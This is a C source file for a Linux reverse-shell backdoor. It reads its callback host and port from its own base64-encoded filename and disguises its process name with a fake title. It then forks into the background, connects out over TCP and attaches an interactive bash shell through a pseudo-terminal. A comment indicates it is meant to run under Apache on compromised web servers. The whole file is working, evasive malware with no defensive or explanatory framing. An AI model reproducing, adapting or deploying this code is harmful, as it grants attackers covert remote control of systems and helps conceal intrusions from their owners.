//#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/types.h>   //old UNIX flag must be add sys/types.h before /sys header files
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <string.h>
#include <pty.h>
#include <utmp.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/prctl.h>
# define MAXBUF 1024
# define MAXLINE 2048
extern char **environ;
static char **g_main_Argv = NULL;	/* pointer to argument vector */
static char *g_main_LastArgv = NULL;	/* end of argv */


void setproctitle_init(int argc, char **argv, char **envp)
{
	int i;
	for (i = 0; envp[i] != NULL; i++) // calc envp num
		continue;
	environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer
	for (i = 0; envp[i] != NULL; i++)
	{
		environ[i] = malloc(sizeof(char) * strlen(envp[i]));
		strcpy(environ[i], envp[i]);
	}
	environ[i] = NULL;
	g_main_Argv = argv;
	if (i > 0)
		g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
	else
		g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}
void setproctitle(const char *fmt, ...)
{
	char *p;
	int i;
	char buf[MAXLINE];
	extern char **g_main_Argv;
	extern char *g_main_LastArgv;
	va_list ap;
	p = buf;
	va_start(ap, fmt);
	vsprintf(p, fmt, ap);
	va_end(ap);
	i = strlen(buf);
	if (i > g_main_LastArgv - g_main_Argv[0] - 2)
	{
		i = g_main_LastArgv - g_main_Argv[0] - 2;
		buf[i] = '\0';
	}
	//�޸�argv[0]
	(void) strcpy(g_main_Argv[0], buf);
	p = &g_main_Argv[0][i];
	while (p < g_main_LastArgv)
		*p++ = '\0';
	g_main_Argv[1] = NULL;
	//����prctl
	prctl(PR_SET_NAME,buf);
}


static int base64_decode_map[256] = {
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 0   - 15
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 16  - 31
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, // 32  - 47
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, // 48  - 63
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, // 64  - 79
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, // 80  - 95
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, // 96  - 111
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1, // 112 - 127
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 128 - 143
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 144 - 159 
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 160 - 175
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 176 - 191
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 192 - 207
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 208 - 223
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 224 - 239
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 240 - 255
};
 
char *base64_decode(const char* input, char *output)
{
    output[0] = '\0';
    if (input == NULL || output == NULL) 
        return output;
 
    int input_len = strlen(input);
    if (input_len < 4 || input_len % 4 != 0) 
        return output;
 
    // 0xFC -> 11111100
    // 0x03 -> 00000011
    // 0xF0 -> 11110000
    // 0x0F -> 00001111
    // 0xC0 -> 11000000
    char *p = (char*)input;
    char *p_out = output;
    char *p_end = (char*)input + input_len;
    for (; p < p_end; p += 4) {
        *p_out++ = ((base64_decode_map[p[0]] << 2) & 0xFC) | ((base64_decode_map[p[1]] >> 4) & 0x03);
        *p_out++ = ((base64_decode_map[p[1]] << 4) & 0xF0) | ((base64_decode_map[p[2]] >> 2) & 0x0F);
        *p_out++ = ((base64_decode_map[p[2]] << 6) & 0xC0) | (base64_decode_map[p[3]]); 
    }
 
    if (*(input + input_len - 2) == '=') {
        *(p_out - 2) = '\0';
    } else if (*(input + input_len - 1) == '=') {
        *(p_out - 1) = '\0';
    }
 
    return output;
}


int connectback(char *host, u_short port)
{
	int     sock  = socket(AF_INET, SOCK_STREAM, 0);
	struct  sockaddr_in s;
	s.sin_family = AF_INET;
	s.sin_port = htons(port);
	s.sin_addr.s_addr = inet_addr(host);
	if(connect(sock, (struct sockaddr *)&s, sizeof(struct sockaddr_in)) == 0)
		return sock;
//	printf("connect faild: %s\r\n", strerror(errno));
	return -1;
}

int swap(int sockfd, int master)
{
	int epfd, nfds, nb;
	struct epoll_event ev[2], events[5];
	unsigned char buf[MAXBUF];
	
	epfd = epoll_create(2);
	ev[0].data.fd = sockfd;
	ev[0].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev[0]);
	
	ev[1].data.fd = master;
	ev[1].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, master, &ev[1]);
	
	for(;;)
	{
		nfds = epoll_wait(epfd, events, 5, -1);
		int i;
		for(i = 0;i < nfds; i ++)
		{
			if(events[i].data.fd == sockfd)
			{
				nb = read(sockfd, buf, MAXBUF);
				if(!nb)
					goto __LABEL_EXIT;
				write(master, buf, nb);
			}
			if(events[i].data.fd == master)
			{
				nb = read(master, buf, MAXBUF);
				if(!nb)
					goto __LABEL_EXIT;
				write(sockfd, buf, nb);
			}
		}
	}
	__LABEL_EXIT:
		close(sockfd);
		close(master);
		close(epfd);
	
	return 0;
}

void sig_child(int signo)
{
	int status;
	pid_t pid = wait(&status);
//	printf("child %d terminated.\r\n", pid);
	exit(0);
}
int main(int argc, char* argv[])
{
	char ptsname[32] = {0};
	pid_t pid  = -1; 
	int master = -1;
	char*   p;
	int i;
	char argv_buf[MAXLINE] = {0}; // save argv paramters
	int sockfd = -1;
	u_short port;
	char*   name = (char*)malloc(sizeof(char)*32);
	char*   host = (char*)malloc(sizeof(char)*32);
	char*   result = (char*)malloc(sizeof(char)*32);
	char*   fakename = (char*)malloc(sizeof(char)*32);
	
	
	strcpy(name, argv[0]);
	strcpy(fakename, argv[1]);
	while (strchr(name, '/') != NULL){
		strcpy(name, strchr(name, '/')+1);
	}
	result = base64_decode(name, result);
	p = strtok(result, "-");
	host = p;
	p = strtok(NULL, "-");
	port = (u_short) atoi(p);

	for( i = 1; i < argc; i++)
	{
		strcat(argv_buf, argv[i]);
		strcat(argv_buf, " ");
	}
	setproctitle_init(argc, argv, environ);
	setproctitle("%s", argv[1]);
	for (i = 0; environ[i] != NULL; i++)
		free(environ[i]);

	//fork child process, no hung
	pid = fork();
	if(pid == -1)
		return -1;
	if(pid > 0)
		return pid;

	//connection back with tcp
	if((sockfd = connectback(host, port)) == -1)
		return 0;
	
	//setup handler for SIGCHLD
	signal(SIGCHLD, sig_child);
	
	//fork and open pty
	pid = forkpty(&master, ptsname, NULL, NULL);
	
	//child open bash shell
	if(pid == 0)
		execlp("/bin/bash", "-i", NULL);

	//dup2 stdin/stdout/stderr to sockfd, it's will hung executed by apache if not do this step
	for(i = 0;i < 3; i ++)
		dup2(sockfd, i);
	//parent swap data
//	printf("[%s][PID=%d]\r\n", ptsname, (int) pid);
	swap(sockfd, master);

	return 0;
}

